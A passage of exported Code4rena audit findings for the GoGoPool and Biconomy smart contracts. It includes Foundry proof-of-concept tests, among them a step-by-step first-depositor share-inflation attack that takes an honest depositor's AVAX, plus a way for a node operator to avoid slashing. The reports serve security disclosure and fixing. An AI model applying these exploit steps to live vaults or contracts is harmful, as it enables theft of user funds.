["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "fix security (sponsor)", "M-19"], "target": "2022-12-gogopool-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L484-L515 https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ClaimNodeOp.sol#L81-L84 https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ClaimNodeOp.sol#L51   # Vulnerability details  ## Impact The `MinipoolManager.recordStakingError` function ([https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L484-L515](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L484-L515)) does not decrease the `minipoolCount` of the staker.    This means that if a staker has a minipool that encounters an error, his `minipoolCount` can never go to zero again.    This is bad because the `minipoolCount` is used in `ClaimNodeOp.calculateAndDistributeRewards` to determine if the `rewardsStartTime` of the staker should be reset ([https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ClaimNodeOp.sol#L81-L84](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ClaimNodeOp.sol#L81-L84)).    Since the `minipoolCount` cannot go to zero, the `rewardsStartTime` will never be reset.    This means that the staker is immediately eligible for rewards when he creates a minipool again whereas he should have to wait `rewardsEligibilityMinSeconds` before he is eligible (which is 14 days at the moment) ([https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ClaimNodeOp.sol#L51](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ClaimNodeOp.sol#L51)).    To conclude, failing to decrease the `minipoolCount` allows the staker to earn higher rewards because he is eligible for staking right after he creates a new minipool and does not have to wait again.    ## Proof of Concept I have created the following test that you can add to the `MinipoolManager.t.sol` file that logs the `minipoolCount` in the `Staking`, `Error` and `Finished` state.    The `minipoolCount` is always `1` although it should decrease to `0` when `recordStakingError` is called.    ```solidity function testRecordStakingErrorWrongMinipoolCount() public {     uint256 duration = 2 weeks;     uint256 depositAmt = 1000 ether;     uint256 avaxAssignmentRequest = 1000 ether;     uint256 validationAmt = depositAmt + avaxAssignmentRequest;     uint128 ggpStakeAmt = 200 ether;      vm.startPrank(nodeOp);     ggp.approve(address(staking), MAX_AMT);     staking.stakeGGP(ggpStakeAmt);     MinipoolManager.Minipool memory mp1 = createMinipool(depositAmt, avaxAssignmentRequest, duration);     vm.stopPrank();      address liqStaker1 = getActorWithTokens(\"liqStaker1\", MAX_AMT, MAX_AMT);     vm.prank(liqStaker1);     ggAVAX.depositAVAX{value: MAX_AMT}();      vm.prank(address(rialto));     minipoolMgr.claimAndInitiateStaking(mp1.nodeID);      bytes32 txID = keccak256(\"txid\");     vm.prank(address(rialto));     minipoolMgr.recordStakingStart(mp1.nodeID, txID, block.timestamp);      bytes32 errorCode = \"INVALID_NODEID\";      int256 minipoolIndex = minipoolMgr.getIndexOf(mp1.nodeID);      vm.prank(nodeOp);     // minipool count when in \"Staking\" state: 1     console.log(staking.getMinipoolCount(nodeOp));     vm.prank(address(rialto));     minipoolMgr.recordStakingError{value: validationAmt}(mp1.nodeID, errorCode);     vm.prank(nodeOp);     // minipool count when in \"Error\" state: 1     console.log(staking.getMinipoolCount(nodeOp));      vm.prank(address(rialto));      assertEq(vault.balanceOf(\"MinipoolManager\"), depositAmt);      MinipoolManager.Minipool memory mp1Updated = minipoolMgr.getMinipool(minipoolIndex);      vm.prank(address(rialto));     minipoolMgr.finishFailedMinipoolByMultisig(mp1Updated.nodeID);     MinipoolManager.Minipool memory mp1finished = minipoolMgr.getMinipool(minipoolIndex);     vm.prank(nodeOp);     // minipool count when in \"Finished\" state: 1     console.log(staking.getMinipoolCount(nodeOp)); } ```  ## Tools Used VSCode  ## Recommended Mitigation Steps You need to simply add the line `staking.decreaseMinipoolCount(owner);` to the `MinipoolManager.recordStakingError` function.  "}, {"title": "Inflation of ggAVAX share price by first depositor", "html_url": "https://github.com/code-423n4/2022-12-gogopool-findings/issues/209", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "fix token (sponsor)", "H-05"], "target": "2022-12-gogopool-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L123   # Vulnerability details  ## Impact  Inflation of `ggAVAX` share price can be done by depositing as soon as the vault is created.  Impact: 1. Early depositor will be able steal other depositors funds 2. Exchange rate is inflated. As a result depositors are not able to deposit small funds.  ## Proof of Concept  If `ggAVAX` is not seeded as soon as it is created, a malicious depositor can deposit 1 WEI of AVAX to receive 1 share.  The depositor can donate WAVAX to the vault and call `syncRewards`. This will start inflating the price.  When the attacker front-runs the creation of the vault, the attacker:  1. Calls `depositAVAX` to receive 1 share 2. Transfers `WAVAX` to `ggAVAX` 3. Calls `syncRewards` to inflate exchange rate  The issue exists because the exchange rate is calculated as the ratio between the `totalSupply` of shares and the `totalAssets()`. When the attacker transfers `WAVAX` and calls `syncRewards()`, the `totalAssets()` increases gradually and therefore the exchange rate also increases.  `convertToShares `: https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L123 ```  function convertToShares(uint256 assets) public view virtual returns (uint256) {   uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.    return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());  } ```  Its important to note that while it is true that cycle length is 14 days, in practice time between cycles can very between 0-14 days. This is because syncRewards validates that the next reward cycle is evenly divided by the length (14 days).  `syncRewards`: https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L102 ```  function syncRewards() public { ----------   // Ensure nextRewardsCycleEnd will be evenly divisible by `rewardsCycleLength`.   uint32 nextRewardsCycleEnd = ((timestamp + rewardsCycleLength) / rewardsCycleLength) * rewardsCycleLength; ---------  } ```  Therefore: - The closer the call to `syncRewards` is to the next evenly divisible value of `rewardsCycleLength`, the closer the next  `rewardsCycleEnd` will be.  - The closer the delta between `syncRewards` calls is, the higher revenue the attacker will get.  Edge case example:  `syncRewards` is called with the timestamp 1672876799, `syncRewards` will be able to be called again 1 second later. `(1672876799 + 14 days) / 14 days) * 14 days) = 1672876800`  Additionally, the price inflation causes a revert for users who want to deposit less then the donation (WAVAX transfer) amount, due to precision rounding when depositing.  `depositAVAX`: https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L166 ```  function depositAVAX() public payable returns (uint256 shares) { ------   if ((shares = previewDeposit(assets)) == 0) {    revert ZeroShares();   } ------  } ```  `previewDeposit` and `convertToShares `: https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L133 https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L123 ```  function convertToShares(uint256 assets) public view virtual returns (uint256) {   uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.    return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());  }  function previewDeposit(uint256 assets) public view virtual returns (uint256) {   return convertToShares(assets);  } ```  ### Foundry POC  The POC will demonstrate the below scenario: 1. Bob front-runs the vault creation. 2. Bob deposits 1 WEI of AVAX to the vault. 3. Bob transfers 1000 WAVAX to the vault. 4. Bob calls `syncRewards` when block.timestamp = `1672876799`. 5. Bob waits 1 second. 6. Bob calls `syncRewards` again. Share price fully inflated. 7. Alice deposits 2000 AVAX to vault. 8. Bob withdraws 1500 AVAX (steals 500 AVAX from Alice). 9. Alice share earns her 1500 AVAX (although she deposited 2000).  Additionally, the POC will show that depositors trying to deposit less then the donation amount will revert.   Add the following test to `TokenggAVAX.t.sol`: https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/test/unit/TokenggAVAX.t.sol#L108 ```  function testShareInflation() public {   uint256 depositAmount = 1;   uint256 aliceDeposit = 2000 ether;   uint256 donationAmount = 1000 ether;   vm.deal(bob, donationAmount  + depositAmount);   vm.deal(alice, aliceDeposit);   vm.warp(1672876799);    // create new ggAVAX   ggAVAXImpl = new TokenggAVAX();   ggAVAX = TokenggAVAX(deployProxy(address(ggAVAXImpl), address(guardian)));   ggAVAX.initialize(store, ERC20(address(wavax)));    // Bob deposits 1 WEI of AVAX   vm.prank(bob);   ggAVAX.depositAVAX{value: depositAmount}();   // Bob transfers 1000 AVAX to vault   vm.startPrank(bob);   wavax.deposit{value: donationAmount}();   wavax.transfer(address(ggAVAX), donationAmount);   vm.stopPrank();   // Bob Syncs rewards   ggAVAX.syncRewards();    // 1 second has passed   // This can range between 0-14 days. Every seconds, exchange rate rises   skip(1 seconds);    // Alice deposits 2000 AVAX   vm.prank(alice);   ggAVAX.depositAVAX{value: aliceDeposit}();    //Expectet revert when any depositor deposits less then 1000 AVAX   vm.expectRevert(bytes4(keccak256(\"ZeroShares()\")));   ggAVAX.depositAVAX{value: 10 ether}();    // Bob withdraws maximum assests for his share   uint256 maxWithdrawAssets = ggAVAX.maxWithdraw(bob);   vm.prank(bob);   ggAVAX.withdrawAVAX(maxWithdrawAssets);    //Validate bob has withdrawn 1500 AVAX    assertEq(bob.balance, 1500 ether);    // Alice withdraws maximum assests for her share   maxWithdrawAssets = ggAVAX.maxWithdraw(alice);   ggAVAX.syncRewards(); // to update accounting   vm.prank(alice);   ggAVAX.withdrawAVAX(maxWithdrawAssets);    // Validate that Alice withdraw 1500 AVAX + 1 (~500 AVAX loss)   assertEq(alice.balance, 1500 ether + 1);  } ```  To run the POC, execute: ``` forge test -m testShareInflation -v ```  Expected output: ``` Running 1 test for test/unit/TokenggAVAX.t.sol:TokenggAVAXTest [PASS] testShareInflation() (gas: 3874399) Test result: ok. 1 passed; 0 failed; finished in 8.71s ```  ## Tools Used  VS Code, Foundry  ## Recommended Mitigation Steps  When creating the vault add initial funds in order to make it harder to inflate the price.  Best practice would add initial funds as part of the initialization of the contract (to prevent front-running)."}, {"title": "Division by zero error can block RewardsPool#startRewardCycle if all multisig wallet are disabled.", "html_url": "https://github.com/code-423n4/2022-12-gogopool-findings/issues/143", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "fix security (sponsor)", "M-21"], "target": "2022-12-gogopool-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/RewardsPool.sol#L229 https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/RewardsPool.sol#L156   # Vulnerability details  ## Impact  Division by zero error can block RewardsPool#startRewardCycle if all multisig wallet is disabled.  ## Proof of Concept  A user needs to call the function startRewardsCycle in RewardsPool.sol  ```solidity /// @notice Public function that will run a GGP rewards cycle if possible function startRewardsCycle() external { ```  which calls:  ```solidity uint256 multisigClaimContractAllotment = getClaimingContractDistribution(\"ClaimMultisig\"); uint256 nopClaimContractAllotment = getClaimingContractDistribution(\"ClaimNodeOp\"); uint256 daoClaimContractAllotment = getClaimingContractDistribution(\"ClaimProtocolDAO\"); if (daoClaimContractAllotment + nopClaimContractAllotment + multisigClaimContractAllotment > getRewardsCycleTotalAmt()) {  revert IncorrectRewardsDistribution(); }  TokenGGP ggp = TokenGGP(getContractAddress(\"TokenGGP\")); Vault vault = Vault(getContractAddress(\"Vault\"));  if (daoClaimContractAllotment > 0) {  emit ProtocolDAORewardsTransfered(daoClaimContractAllotment);  vault.transferToken(\"ClaimProtocolDAO\", ggp, daoClaimContractAllotment); }  if (multisigClaimContractAllotment > 0) {  emit MultisigRewardsTransfered(multisigClaimContractAllotment);  distributeMultisigAllotment(multisigClaimContractAllotment, vault, ggp); }  if (nopClaimContractAllotment > 0) {  emit ClaimNodeOpRewardsTransfered(nopClaimContractAllotment);  ClaimNodeOp nopClaim = ClaimNodeOp(getContractAddress(\"ClaimNodeOp\"));  nopClaim.setRewardsCycleTotal(nopClaimContractAllotment);  vault.transferToken(\"ClaimNodeOp\", ggp, nopClaimContractAllotment); } ```  We need to pay speical attention to the code block below:  ```solidity if (multisigClaimContractAllotment > 0) {  emit MultisigRewardsTransfered(multisigClaimContractAllotment);  distributeMultisigAllotment(multisigClaimContractAllotment, vault, ggp); } ```  which calls:  ```solidity /// @notice Distributes GGP to enabled Multisigs /// @param allotment Total GGP for Multisigs /// @param vault Vault contract /// @param ggp TokenGGP contract function distributeMultisigAllotment( uint256 allotment, Vault vault, TokenGGP ggp ) internal { MultisigManager mm = MultisigManager(getContractAddress(\"MultisigManager\"));  uint256 enabledCount; uint256 count = mm.getCount(); address[] memory enabledMultisigs = new address[](count);  // there should never be more than a few multisigs, so a loop should be fine here for (uint256 i = 0; i < count; i++) {  (address addr, bool enabled) = mm.getMultisig(i);  if (enabled) {   enabledMultisigs[enabledCount] = addr;   enabledCount++;  } }  // Dirty hack to cut unused elements off end of return value (from RP) // solhint-disable-next-line no-inline-assembly assembly {  mstore(enabledMultisigs, enabledCount) }  uint256 tokensPerMultisig = allotment / enabledCount; for (uint256 i = 0; i < enabledMultisigs.length; i++) {  vault.withdrawToken(enabledMultisigs[i], ggp, tokensPerMultisig); } } ```  the code distribute the reward to all multisig evenly.  ```solidity uint256 tokensPerMultisig = allotment / enabledCount; ```  However, if the enabledCount is 0, meaning no multisig wallet is enabled, the transactionr revert in division by zero error and revert the startRewardsCycle transaction.  As showns in POC.  In RewardsPool.t.sol,  we change the name from testStartRewardsCycle to testStartRewardsCycle_POC  https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/test/unit/RewardsPool.t.sol#L123  we add the code to disable all multisig wallet. before calling rewardsPool.startRewardsCycle  https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/test/unit/RewardsPool.t.sol#L138  ```solidity // disable all multisg wallet vm.prank(guardian); ocyticus.disableAllMultisigs(); ```  Then we run the test  ```solidity forge test -vvv --match testStartRewardsCycle_POC ```  the transaction revert in division by zero error, which block the startRewardsCycle  ```solidity     \u2502   \u251c\u2500 emit MultisigRewardsTransfered(value: 13499352589262561353689)     \u2502   \u251c\u2500 [537] Storage::getAddress(0xcda836d09bcf3adcec2f52ddddeceac31738a574d5063511c887064e499593df) [staticcall]     \u2502   \u2502   \u2514\u2500 \u2190 MultisigManager: [0xA12E9172eB5A8B9054F897cC231Cd7a2751D6D93]     \u2502   \u251c\u2500 [1313] MultisigManager::getCount() [staticcall]     \u2502   \u2502   \u251c\u2500 [549] Storage::getUint(0x778484468bc504108f077f6bf471293e4138c2d117c6f33607855518cf4bda79) [staticcall]     \u2502   \u2502   \u2502   \u2514\u2500 \u2190 1     \u2502   \u2502   \u2514\u2500 \u2190 1     \u2502   \u251c\u2500 [3050] MultisigManager::getMultisig(0) [staticcall]     \u2502   \u2502   \u251c\u2500 [537] Storage::getAddress(0xfebe6f39b65f18e050b53df1d0c8d45b8c5cce333324eb048b67b8ee5f26b7a3) [staticcall]     \u2502   \u2502   \u2502   \u2514\u2500 \u2190 RialtoSimulator: [0x98D1613BC08756f51f46E841409E61C32f576F2f]     \u2502   \u2502   \u251c\u2500 [539] Storage::getBool(0x7ef800e7ca09c0c1063313b56290c06f6bc4bae0e9b7af3899bb7d5ade0403c8) [staticcall]     \u2502   \u2502   \u2502   \u2514\u2500 \u2190 false     \u2502   \u2502   \u2514\u2500 \u2190 RialtoSimulator: [0x98D1613BC08756f51f46E841409E61C32f576F2f], false     \u2502   \u2514\u2500 \u2190 \"Division or modulo by 0\"     \u2514\u2500 \u2190 \"Division or modulo by 0\"  Test result: FAILED. 0 passed; 1 failed; finished in 11.64ms  Failing tests: Encountered 1 failing test in test/unit/RewardsPool.t.sol:RewardsPoolTest [FAIL. Reason: Division or modulo by 0] testStartRewardsCycle_POC() (gas: 332890) ```  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  We recommend the project handle the case when the number of enabled multisig is 0 gracefully to not block the startRewardCycle transaction."}, {"title": "MinipoolManager: node operator can avoid being slashed", "html_url": "https://github.com/code-423n4/2022-12-gogopool-findings/issues/136", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "edited-by-warden", "fix security (sponsor)", "H-06"], "target": "2022-12-gogopool-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L385-L440 https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L484-L515 https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L670-L683 https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/Staking.sol#L94-L97   # Vulnerability details  ## Impact When staking is done, a Rialto multisig calls `MinipoolManager.recordStakingEnd` ([https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L385-L440](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L385-L440)).    If the `avaxTotalRewardAmt` has the value zero, the `MinipoolManager` will slash the node operator's GGP.    The issue is that the amount to slash can be greater than the GGP balance the node operator has staked.    This will cause the call to `MinipoolManager.recordStakingEnd` to revert because an underflow is detected.    This means a node operator can create a minipool that cannot be slashed.    A node operator must provide at least 10% of `avaxAssigned` as collateral by staking GGP.    It is assumed that a node operator earns AVAX at a rate of 10% per year.    So if a Minipool is created with a duration of `> 365 days`, the 10% collateral is not sufficient to pay the expected rewards.    This causes the function call to revert.    Another cause of the revert can be that the GGP price in AVAX changes. Specifically if the GGP price falls, there needs to be slashed more GGP.    Therefore if the GGP price drops enough it can cause the call to slash to revert.    I think it is important to say that with any collateralization ratio this can happen. The price of GGP must just drop enough or one must use a long enough duration.    The exact impact of this also depends on how the Rialto multisig handles failed calls to `MinipoolManager.recordStakingEnd`.    It looks like if this happens, `MinipoolManager.recordStakingError` ([https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L484-L515](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L484-L515)) is called.    This allows the node operator to withdraw his GGP stake.    **So in summary a node operator can create a Minipool that cannot be slashed and probably remove his GGP stake when it should have been slashed.**    ## Proof of Concept When calling `MinipoolManager.recordStakingEnd` ([https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L385-L440](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L385-L440)) and the `avaxTotalRewardAmt` parameter is zero, the node operator is slashed:   ```solidity // No rewards means validation period failed, must slash node ops GGP. if (avaxTotalRewardAmt == 0) {     slash(minipoolIndex); } ```  The `MinipoolManager.slash` function ([https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L670-L683](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L670-L683)) then calculates `expectedAVAXRewardsAmt` and from this `slashGGPAmt`:   ```solidity uint256 avaxLiquidStakerAmt = getUint(keccak256(abi.encodePacked(\"minipool.item\", index, \".avaxLiquidStakerAmt\"))); uint256 expectedAVAXRewardsAmt = getExpectedAVAXRewardsAmt(duration, avaxLiquidStakerAmt); uint256 slashGGPAmt = calculateGGPSlashAmt(expectedAVAXRewardsAmt); ```  Downstraem there is then a revert due to underflow because of the following line in `Staking.decreaseGGPStake` ([https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/Staking.sol#L94-L97](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/Staking.sol#L94-L97)):   ```solidity subUint(keccak256(abi.encodePacked(\"staker.item\", stakerIndex, \".ggpStaked\")), amount); ```  You can add the following foundry test to `MinipoolManager.t.sol`:   ```solidity function testRecordStakingEndWithSlashFail() public {     uint256 duration = 366 days;     uint256 depositAmt = 1000 ether;     uint256 avaxAssignmentRequest = 1000 ether;     uint256 validationAmt = depositAmt + avaxAssignmentRequest;     uint128 ggpStakeAmt = 100 ether;      vm.startPrank(nodeOp);     ggp.approve(address(staking), MAX_AMT);     staking.stakeGGP(ggpStakeAmt);     MinipoolManager.Minipool memory mp1 = createMinipool(depositAmt, avaxAssignmentRequest, duration);     vm.stopPrank();      address liqStaker1 = getActorWithTokens(\"liqStaker1\", MAX_AMT, MAX_AMT);     vm.prank(liqStaker1);     ggAVAX.depositAVAX{value: MAX_AMT}();      vm.prank(address(rialto));     minipoolMgr.claimAndInitiateStaking(mp1.nodeID);      bytes32 txID = keccak256(\"txid\");     vm.prank(address(rialto));     minipoolMgr.recordStakingStart(mp1.nodeID, txID, block.timestamp);      vm.startPrank(address(rialto));      skip(duration);      minipoolMgr.recordStakingEnd{value: validationAmt}(mp1.nodeID, block.timestamp, 0 ether); } ```  See that it runs successfully with `duration = 365 days` and fails with `duration = 366 days`.    The similar issue occurs when the GGP price drops. I chose to implement the test with `duration` as the cause for the underflow because your tests use a fixed AVAX/GGP price.    ## Tools Used VSCode, Foundry  ## Recommended Mitigation Steps You should check if the amount to be slashed is greater than the node operator's GGP balance. If this is the case, the amount to be slashed should be set to the node operator's GGP balance.    I believe this check can be implemented within the `MinipoolManager.slash` function without breaking any of the existing accounting logic.    ```solidity function slash(int256 index) private {     address nodeID = getAddress(keccak256(abi.encodePacked(\"minipool.item\", index, \".nodeID\")));     address owner = getAddress(keccak256(abi.encodePacked(\"minipool.item\", index, \".owner\")));     uint256 duration = getUint(keccak256(abi.encodePacked(\"minipool.item\", index, \".duration\")));     uint256 avaxLiquidStakerAmt = getUint(keccak256(abi.encodePacked(\"minipool.item\", index, \".avaxLiquidStakerAmt\")));     uint256 expectedAVAXRewardsAmt = getExpectedAVAXRewardsAmt(duration, avaxLiquidStakerAmt);     uint256 slashGGPAmt = calculateGGPSlashAmt(expectedAVAXRewardsAmt);     setUint(keccak256(abi.encodePacked(\"minipool.item\", index, \".ggpSlashAmt\")), slashGGPAmt);      emit GGPSlashed(nodeID, slashGGPAmt);      Staking staking = Staking(getContractAddress(\"Staking\"));      if (slashGGPAmt > staking.getGGPStake(owner)) {         slashGGPAmt = staking.getGGPStake(owner);     }          staking.slashGGP(owner, slashGGPAmt); } ```  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/533", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-01"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/adriro-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/529", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "G-01"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/giovannidisiena-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/527", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-02"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/giovannidisiena-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/515", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-03"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/lukris02-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/507", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-04"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/juancito-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/505", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-05"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/pauliax-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/503", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "G-02"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Rageur-G.md)."}, {"title": "[Medium-3] Non-compliance with EIP-4337", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/498", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-02"], "target": "2023-01-biconomy-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/BaseSmartAccount.sol#L60-L68 https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L319-L329 https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/BaseSmartAccount.sol#L60-L68   # Vulnerability details  ## Impact  Some parts of the codebase are not compliant with the EIP-4337 from the [EIP-4337 specifications](https://eips.ethereum.org/EIPS/eip-4337#specification), at multiple degrees of severity.  ## Proof of Concept  ### Sender existence  ```text Create the account if it does not yet exist, using the initcode provided in the UserOperation. If the account does not exist, and the initcode is empty, or does not deploy a contract at the \u201csender\u201d address, the call must fail. ```  If we take a look at the [`_createSenderIfNeeded()`]() function, we can see that it's not properly implemented: ```solidity function _createSenderIfNeeded(uint256 opIndex, UserOpInfo memory opInfo, bytes calldata initCode) internal {  if (initCode.length != 0) {   address sender = opInfo.mUserOp.sender;      if (sender.code.length != 0) revert FailedOp(opIndex, address(0), \"AA10 sender already constructed\");        address sender1 = senderCreator.createSender{gas: opInfo.mUserOp.verificationGasLimit}(initCode);         if (sender1 == address(0)) revert FailedOp(opIndex, address(0), \"AA13 initCode failed or OOG\");         if (sender1 != sender) revert FailedOp(opIndex, address(0), \"AA14 initCode must return sender\");         if (sender1.code.length == 0) revert FailedOp(opIndex, address(0), \"AA15 initCode must create sender\");         address factory = address(bytes20(initCode[0:20]));        emit AccountDeployed(opInfo.userOpHash, sender, factory, opInfo.mUserOp.paymaster);  } } ```  The statement in the EIP implies that if the account does not exist, the initcode **must** be used. In this case, it first check if the initcode exists, but this condition should be checked later.  This could be rewritten to:  ```solidity function _createSenderIfNeeded(uint256 opIndex, UserOpInfo memory opInfo, bytes calldata initCode) internal {  address sender = opInfo.mUserOp.sender;  if (sender.code.length == 0) {   require(initCode.length != 0, \"empty initcode\");   address sender1 = senderCreator.createSender{gas: opInfo.mUserOp.verificationGasLimit}(initCode);         if (sender1 == address(0)) revert FailedOp(opIndex, address(0), \"AA13 initCode failed or OOG\");         if (sender1 != sender) revert FailedOp(opIndex, address(0), \"AA14 initCode must return sender\");         if (sender1.code.length == 0) revert FailedOp(opIndex, address(0), \"AA15 initCode must create sender\");         address factory = address(bytes20(initCode[0:20]));        emit AccountDeployed(opInfo.userOpHash, sender, factory, opInfo.mUserOp.paymaster);  } } ```  ### Account  The third specification of the [`validateUserOp()`](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/BaseSmartAccount.sol#L60-L68) is the following:  ```text If the account does not support signature aggregation, it MUST validate the signature is a valid signature of the userOpHash, and SHOULD return SIG_VALIDATION_FAILED (and not revert) on signature mismatch. Any other error should revert. ```  This is currently not the case, as the case when the account does not support signature aggregation is not supported right now in the code. The `validateUserOp()` [reverts everytime](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L319-L329) if the recovered signature does not match.  Additionally, the `validateUserOp()` 